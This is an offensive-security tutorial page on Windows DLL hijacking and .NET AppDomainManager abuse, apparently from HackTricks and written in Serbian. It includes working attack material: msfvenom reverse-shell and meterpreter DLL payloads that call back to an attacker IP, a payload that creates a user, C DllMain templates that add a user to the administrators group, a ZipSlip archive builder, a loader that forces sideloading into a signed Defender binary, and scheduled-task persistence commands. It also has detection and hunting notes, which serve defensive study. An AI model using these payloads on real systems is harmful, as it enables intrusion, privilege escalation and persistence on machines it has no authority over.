# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom kako bi učitala zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda i postizanje opstanka, a ređe za eskalaciju privilegija. Iako je ovde naglasak na eskalaciji, način otmice ostaje isti bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking koriste se različite metode, a njihova efikasnost zavisi od načina na koji aplikacija učitava DLL-ove:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena originalnog DLL-a zlonamernim, uz mogućnost korišćenja DLL Proxying-a za očuvanje funkcionalnosti originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pretrage koja ima prednost u odnosu na legitimni DLL, čime se iskorišćava obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji će aplikacija učitati, misleći da je reč o nepostojećem DLL-u koji joj je potreban.
4. **DLL Redirection**: Izmena parametara pretrage kao što je `%PATH%` ili datoteka `.exe.manifest` / `.exe.local` kako bi se aplikacija usmerila ka zlonamernom DLL-u.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernom verzijom u direktorijumu WinSxS, što se često povezuje sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika, zajedno sa kopiranom aplikacijom, što podseća na tehnike Binary Proxy Execution.

Aplikacija može da implementira i **sopstveni DLL loader**. Proces sa višim privilegijama može da pregleda poddirektorijum, kao što je `Libraries` ili `Plugins`, pa да просledi изабрани DLL помоћном програму, независно од уобичајеног редоследа претраге DLL-ова у Windows-у. Ако други налог може да креира датотеке у том тачном директоријуму, сматрајте то поводом за проверу: потврдите идентитет процеса, ефективни ACL директоријума, правило избора датотеке и доступну операцију учитавања. То што је директоријум поред извршне датотеке уписив не значи да процес из њега учитава DLL-ове.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класични DLL sideloading није једини начин да се поузданом процесу **.NET Framework** омогући учитавање кода нападача. Ако је циљна извршна датотека **managed** апликација, CLR такође проверава **конфигурациону датотеку апликације** чије име одговара имену извршне датотеке (на пример, `Setup.exe.config`). У тој датотеци може да се дефинише прилагођени **AppDomainManager**. Ако конфигурација упућује на склоп под контролом нападача који се налази поред EXE датотеке, CLR га учитава **пре уобичајеног пута извршавања апликације** и покреће унутар поузданог процеса.<sup>[[24]](#references)</sup>

Према Microsoft-овој шеми конфигурације за .NET Framework, елементи `<appDomainManagerAssembly>` и `<appDomainManagerType>` морају оба бити присутна да би се користио прилагођени менаџер.<sup>[[16]](#references)[[17]](#references)</sup>

Минимална конфигурација:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalni upravljač:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zasniva se na parsiranju CLR konfiguracije, a ne na redosledu pretrage Win32 DLL-ova.
- Host zaista mora biti **managed EXE**. Brza trijaža: `sigcheck -m target.exe`, `corflags target.exe` ili provera **CLR Runtime Header**-a u PE metapodacima.
- Naziv konfiguracione datoteke mora se tačno podudarati s nazivom izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE-a**.
- Ovo je korisno sa **potpisanim Microsoft/vendor binarnim datotekama** jer pouzdani EXE ostaje netaknut, dok se zlonamerni managed assembly izvršava unutar procesa.
- Ako već imate direktorijum instalatora/ažuriranja u koji možete da upisujete, AppDomainManager hijacking može se koristiti kao **prva faza**, a zatim za kasnije faze klasični DLL sideloading ili reflective loading.

### AppDomainManager kao downloader + bootstrap za scheduled task

Praktičan obrazac upada je uparivanje pouzdanog managed EXE-a sa zlonamernim `*.config` fajlom i zlonamernim AppDomainManager DLL-om koji služi samo kao **mali bootstrapper**:<sup>[[25]](#references)</sup>

1. Korisnik pokreće potpisani .NET installer ili updater sa uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Pridruženi config navodi CLR da učita napadačev assembly **pre nego što počne legitimna logika aplikacije**.
3. Zlonamerni manager sprovodi **path gate** (na primer, nastavlja samo ako se host EXE pokreće iz direktorijuma `Downloads`, a drugoj fazi dozvoljava pokretanje samo iz `%LOCALAPPDATA%`).
4. Ako provera prođe, preuzima stvarni payload u putanju u koju korisnik može da upisuje, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta važna:
- Potpisani host EXE ostaje neizmenjen, pa trijaža koja proverava hash samo glavne binarne datoteke može da ne otkrije kompromitovanje.
- Jednostavan **path-based anti-analysis** je čest: premeštanje ZIP/EXE/DLL trojke na Desktop, u Temp ili na putanju sandbox-a može namerno da prekine lanac.
- AppDomainManager DLL prve faze može ostati mali i neupadljiv dok se stvarni implant ne preuzme kasnije.

Minimalni primer persistence-a koji se često viđa uz ovaj obrazac:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Napomene:
- ` /rl highest` znači **najviši dostupan nivo** za tog korisnika/sesiju; sam po sebi ne garantuje eskalaciju na SYSTEM.
- Ovu tehniku je često bolje klasifikovati kao **izvršavanje/perzistenciju zloupotrebom .NET konfiguracije** nego kao klasično hijackovanje redosleda pretrage za DLL koji nedostaje, iako operateri često kombinuju obe tehnike.

Pokazatelji za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz **putanja za raspakivanje ZIP arhiva**, fascikli `Downloads`, `%TEMP%` ili drugih direktorijuma u koje korisnik može da upisuje, uz **pridruženu** datoteku `<exe>.config`.
- Novi zakazani zadaci čija radnja upućuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, a čiji nazivi imitiraju programe za ažuriranje pregledača/proizvođača.
- Kratkotrajni upravljani procesi za pokretanje koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Uzorci koji se rano zatvaraju ako putanja do izvršnog fajla ne odgovara očekivanom direktorijumu korisničkog profila.

### Hijackovanje postojećeg zakazanog zadatka radi ponovnog pokretanja lanca sideload-a

Za perzistenciju nemojte tražiti samo **kreiranje novog zadatka**. Neke grupe za upade čekaju da legitimni instalacioni program napravi **uobičajeni zadatak za ažuriranje**, a zatim **prepravljaju radnju zadatka** tako da postojeći naziv, autor i okidač ostanu poznati braniocima.

Ponovljiv postupak:
1. Instalirajte/pokrenite legitimni softver i utvrdite koji zadatak on obično kreira.
2. Izvezite XML zadatka i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo radnju tako da zadatak pokreće vaš **pouzdani EXE domaćin** iz privremenog direktorijuma u koji korisnik može da upisuje, a koji zatim učitava pravi payload putem side-load-a ili AppDomain-a.
4. Ponovo registrujte isti naziv zadatka umesto kreiranja novog, očiglednog artefakta perzistencije.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Zašto je prikrivenije:
- Ime zadatka i dalje može delovati legitimno (na primer, kao alat za ažuriranje dobavljača).
- Pokreće ga **Task Scheduler service**, pa validacija roditeljskog/nadređenog procesa često vidi očekivani lanac raspoređivanja umesto `explorer.exe`.
- DFIR timovi koji traže samo **nova imena zadataka** mogu prevideti zadatak čija je registracija već postojala, ali čija radnja sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili neku drugu putanju pod kontrolom napadača.

Brze tačke za proveru:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke u `C:\Windows\System32\Tasks\*` i metapodatke u `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa osnovnim stanjem.
- Generišite upozorenje kada se **zadatak za ažuriranje koji izgleda kao da pripada dobavljaču** pokreće iz **direktorijuma u koje korisnik može da upisuje** ili pokreće .NET EXE sa pridruženom datotekom `*.config`.

> [!TIP]
> Za lanac korak po korak koji dodaje HTML staging, AES-CTR konfiguracije i .NET implantate povrh DLL sideloading-a, pogledajte tok rada u nastavku.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje DLL-ova koji nedostaju

Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz paketa sysinternals i **postavite** **sledeća 2 filtera**:

![Uobičajene tehnike - Pronalaženje DLL-ova koji nedostaju: Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete procmon iz paketa sysinternals i postavite sledeća 2 filtera](<../../../images/image (961).png>)

![Uobičajene tehnike - Pronalaženje DLL-ova koji nedostaju: Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete procmon iz paketa sysinternals i postavite sledeća 2 filtera](<../../../images/image (230).png>)

i prikažete samo **aktivnost sistema datoteka**:

![Uobičajene tehnike - Pronalaženje DLL-ova koji nedostaju: i prikažite samo aktivnost sistema datoteka](<../../../images/image (153).png>)

Ako tražite **DLL-ove koji uopšteno nedostaju**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **DLL koji nedostaje u određenom izvršnom fajlu**, postavite još jedan filter, kao što je **"Process Name" "contains" `<exec name>`**, pokrenite ga i zaustavite hvatanje događaja.<sup>[[9]](#references)</sup>

## Iskorišćavanje DLL-ova koji nedostaju

Da biste eskalirali privilegije, potražite **DLL koji privilegovani proces pokušava da učita** sa lokacije u koju možete da upisujete. To se može desiti kada imate kontrolu nad direktorijumom koji se pretražuje pre direktorijuma u kom se nalazi legitimni DLL, ili kada traženi DLL ne postoji, a možete da upisujete u neki od direktorijuma koji se pretražuju.

### Redosled pretrage DLL-ova

**U okviru** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi konkretno učitavaju.**

**Windows aplikacije** traže DLL-ove prateći skup **unapred definisanih putanja za pretragu**, po određenom redosledu. Do DLL hijacking-a dolazi kada se zlonamerni DLL strateški smesti u jedan od ovih direktorijuma, tako da se učita pre autentičnog DLL-a. Jedan od načina da se to spreči jeste da aplikacija koristi apsolutne putanje pri navođenju DLL-ova koji su joj potrebni.

U nastavku je prikazan **redosled pretrage DLL-ova na 32-bitnim** sistemima:

1. Direktorijum iz kog je aplikacija učitana.
2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju do ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja vraća putanju do ovog direktorijuma, ali se on ipak pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju do ovog direktorijuma.
   1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u promenljivoj okruženja PATH. Imajte na umu da ovo ne uključuje putanju specifičnu za aplikaciju, navedenu u registarskom ključu **App Paths**. Ključ **App Paths** se ne koristi pri izračunavanju putanje za pretragu DLL-ova.

Ovo je podrazumevani redosled pretrage kada je **SafeDllSearchMode** omogućen. Kada je onemogućen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registarsku vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Konačno, DLL može da se učita pomoću apsolutne putanje umesto imena. U tom slučaju, Windows traži sam DLL samo na toj putanji; zavisnosti navedene po imenu i dalje prate odgovarajući redosled pretrage.

Postoje i drugi načini za promenu redosleda pretrage, ali ih ovde neću objašnjavati.

### Povezivanje proizvoljnog upisa datoteke sa otmicom zbog DLL-a koji nedostaje

**Povezana tehnika:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Pomoću filtera u **ProcMon**-u (`Process Name` = ciljni EXE, `Path` se završava sa `.dll`, `Result` = `NAME NOT FOUND`) prikupite nazive DLL-ova koje proces traži, ali ne može da pronađe.<sup>[[14]](#references)</sup>
2. Ako se binarni fajl pokreće **po rasporedu/kao usluga**, postavljanje DLL-a sa jednim od tih naziva u **direktorijum aplikacije** (stavka br. 1 u redosledu pretrage) dovešće do toga da se učita pri sledećem pokretanju. U jednom slučaju sa .NET skenerom proces je tražio `hostfxr.dll` u `C:\samples\app\` pre nego što je učitao pravu kopiju iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite DLL sa payload-om (npr. reverse shell) i bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitiv **proizvoljan upis u stilu ZipSlip-a**, napravite ZIP čija stavka izlazi iz direktorijuma za raspakivanje, tako da DLL završi u direktorijumu aplikacije:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Isporučite arhivu u nadgledani inbox/share; kada zakazani zadatak ponovo pokrene proces, on učitava zlonamerni DLL i izvršava vaš kod kao servisni nalog.

### Forsiranje sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na putanju pretrage DLL-a novokreiranog procesa jeste da podesite polje DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću nativnih API-ja iz ntdll-a. Ako ovde navedete direktorijum pod kontrolom napadača, ciljni proces koji razrešava uvezeni DLL po imenu (bez apsolutne putanje i bez korišćenja bezbednih zastavica za učitavanje) može biti primoran da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Napravite parametre procesa pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji upućuje na vaš kontrolisani direktorijum (npr. direktorijum u kome se nalazi vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljni binarni fajl razreši DLL po imenu, učitavač će tokom razrešavanja proveriti navedeni DllPath, što omogućava pouzdan sideloading čak i kada zlonamerni DLL nije u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na kreirani podređeni proces; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Ciljni proces mora da uvozi DLL ili da pozove LoadLibrary za DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i fiksno zadate apsolutne putanje ne mogu biti otete. Izvezeni prosleđeni simboli i SxS mogu promeniti redosled prioriteta.

Minimalni primer u C-u (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Kompletan primer u C-u: forsiranje DLL sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji izvozi potrebne funkcije ili prosleđuje pozive pravom DLL-u) u direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji se zna da pomoću gornje tehnike traži xmllite.dll po imenu. Loader razrešava import koristeći navedeni DllPath i učitava vaš DLL putem sideloadinga.

Primećeno je da se ova tehnika koristi u stvarnim napadima za pokretanje višestepenih lanaca sideloadinga: početni pokretač ispušta pomoćni DLL, koji zatim pokreće Microsoft-ovim potpisom potpisani binarni fajl podložan hijackingu, sa prilagođenim DllPath-om kako bi se prinudno učitao napadačev DLL iz privremenog direktorijuma za smeštanje.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking putem `.exe.config`

Za ciljeve **.NET Framework**, sideloading se može obaviti **pre `Main()`** bez menjanja memorije, zloupotrebom susedne datoteke **`.exe.config`** aplikacije. Umesto oslanjanja samo na Win32 redosled pretrage DLL-ova, napadač postavlja legitimni .NET EXE pored zlonamerne konfiguracione datoteke i jednog ili više sklopova pod kontrolom napadača.

Kako funkcioniše lanac:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE se pokreće, a **CLR čita `<exe>.config`**.
2. Konfiguracija postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`** tako da runtime instancira `AppDomainManager` pod kontrolom napadača.
3. Zlonamerni menadžer dobija mogućnost izvršavanja **pre `Main()`** unutar pouzdanog host procesa.
4. Ista konfiguracija može primorati CLR da prvo razrešava lokalne sklopove (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i može oslabiti validaciju/runtime telemetriju bez inline patching-a.

Obrazac karakterističan za kampanje (tačno ugnježđivanje može da varira u zavisnosti od direktive / verzije CLR-a):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava razrešavanje sklopova u direktorijumu aplikacije, pretvarajući fasciklu u predvidljivu površinu za sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** prebacuju izvršavanje na kod napadača tokom inicijalizacije CLR-a, pre nego što se pokrene legitimna logika aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti aplikaciji sa punim poverenjem da učita nepotpisane ili izmenjene sklopove bez greške pri validaciji strong-name potpisa.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** sprečava preusmeravanja publisher-policy pravila na novije sklopove.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a predvidljivijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** je posebno zanimljiv jer **CLR onemogućava sopstvenu ETW vidljivost** putem konfiguracije, umesto da implant u memoriji zakrpi `EtwEventWrite`.

Operativni obrazac uočen u nedavnim kampanjama:
- Faza 1 ispušta `setup.exe`, `setup.exe.config` i lokalne sklopove.
- Faza 2 ih kopira u uverljivu fasciklu **AppData update**, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće putem **zakazanog zadatka**.
- Faza 3 proverava kontekst izvršavanja (na primer, da li je očekivani roditeljski proces `svchost.exe` koji je pokrenuo Task Scheduler) pre učitavanja konačnog RAT DLL-a/eksporta.

Ideje za lov na pretnje:
- Potpisani ili na drugi način legitimni **.NET izvršni fajlovi** koji se pokreću uz sumnjive prateće fajlove **`.config`** na lokacijama u koje korisnik može da upisuje.
- Fajlovi `.config` koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Zakazani zadaci koji ponovo pokreću preimenovane binarne fajlove za ažuriranje iz fascikli **`%LOCALAPPDATA%`** ili fascikli specifičnih za aplikaciju, kao što je `\bin\update\`.
- Lanci roditeljskih/potčinjenih procesa u kojima zakazani zadatak pokreće pouzdani .NET host koji odmah učitava sklopove koji nisu od proizvođača iz sopstvenog direktorijuma.

#### Izuzeci od redosleda pretrage DLL-ova navedeni u dokumentaciji za Windows

U dokumentaciji za Windows navedeni su određeni izuzeci od standardnog redosleda pretrage DLL-ova:

- Kada se naiđe na **DLL čije se ime podudara sa imenom DLL-a koji je već učitan u memoriju**, sistem zaobilazi uobičajenu pretragu. Umesto toga, proverava preusmeravanje i manifest, a zatim, ako ih nema, koristi DLL koji je već učitan u memoriju. **U ovom slučaju sistem ne pretražuje DLL**.
- Ako je DLL prepoznat kao **poznati DLL** za trenutnu verziju operativnog sistema Windows, sistem koristi svoju verziju tog poznatog DLL-a zajedno са зависним DLL-ovima, **bez sprovođenja pretrage**. Кључ регистратора **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** садржи листу ових познатих DLL-ова.
- Ако DLL има **зависности**, зависни DLL-ови се претражују као да су наведени само својим **именима модула**, без обзира на то да ли је почетни DLL пронађен путем путање са пуном путањом.

### Повишавање привилегија

**Захтеви**:

- Идентификујте процес који ради или ће радити под **другачијим привилегијама** (хоризонтално или латерално кретање), а ком **недостаје DLL**.
- Уверите се да имате **приступ за писање** у било који **директоријум** у ком ће се **DLL** претраживати. То може бити директоријум извршног фајла или директоријум у системској путањи.

Ови предуслови су подразумевано неуобичајени: привилегованим извршним фајловима обично не недостају зависни DLL-ови, а стандардни корисници обично не могу да уписују у директоријуме системске путање за претрагу. Ипак, погрешно конфигурисана окружења могу испунити оба услова.\
Ако су захтеви испуњени, погледајте пројекат [UACME](https://github.com/hfiref0x/UACME). Иако му је главни циљ заобилажење UAC-а, садржи PoC-ове за DLL hijacking за одређене верзије Windows-а које се често могу прилагодити директоријуму у који можете да уписујете, а који сте пронашли.

Имајте на уму да дозволе у фасцикли можете **проверити** овако:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **proverite dozvole za sve direktorijume unutar PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Takođe možete proveriti uvoze izvršne datoteke i izvoze DLL-a pomoću:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Za kompletan vodič o tome kako da **zloupotrebite DLL Hijacking za eskalaciju privilegija** uz dozvole za upis u fasciklu **System Path**, pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)proverava da li imate dozvole za upis u neku fasciklu unutar system PATH-a.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

Ako pronađete scenario koji može da se iskoristi, jedna od najvažnijih stvari za uspešno iskorišćavanje jeste da **napravite DLL koji izvozi bar sve funkcije koje će izvršna datoteka uvoziti iz njega**. U svakom slučaju, imajte na umu da je DLL Hijacking koristan za [eskalaciju sa nivoa Medium Integrity na High **(zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa [**High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako da napravite ispravan DLL** možete pronaći u ovoj studiji o DLL hijackingu, koja se bavi DLL hijackingom za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Štaviše, u **sledećem odeljku** možete pronaći neke **osnovne kodove za DLL** koji mogu biti korisni kao **šabloni** ili za pravljenje **DLL-a sa izvezenim funkcijama koje nisu obavezne**.

## **Pravljenje i kompajliranje DLL-ova**

### **DLL Proxifying**

U osnovi, **DLL proxy** je DLL koji može da **izvrši vaš zlonamerni kod pri učitavanju**, ali i da **izloži** funkcije i **radi** kako se **očekuje**, tako što **prosleđuje sve pozive stvarnoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete da **navedete izvršnu datoteku i izaberete biblioteku** koju želite da proxify-ujete, a zatim **generišete proxified DLL**, ili da **navedete DLL** i **generišete proxified DLL**.

### **Meterpreter**

**Nabavite rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Nabavite meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Kreirajte korisnika (x86; nisam video x64 verziju):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Sopstveni

U mnogim slučajevima, DLL koji kompajlirate mora **da eksportuje svaku funkciju koju uvozi proces žrtve**. Ako nedostaje neki obavezni export, binarni fajl ne može da ga razreši i exploit neće uspeti.

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
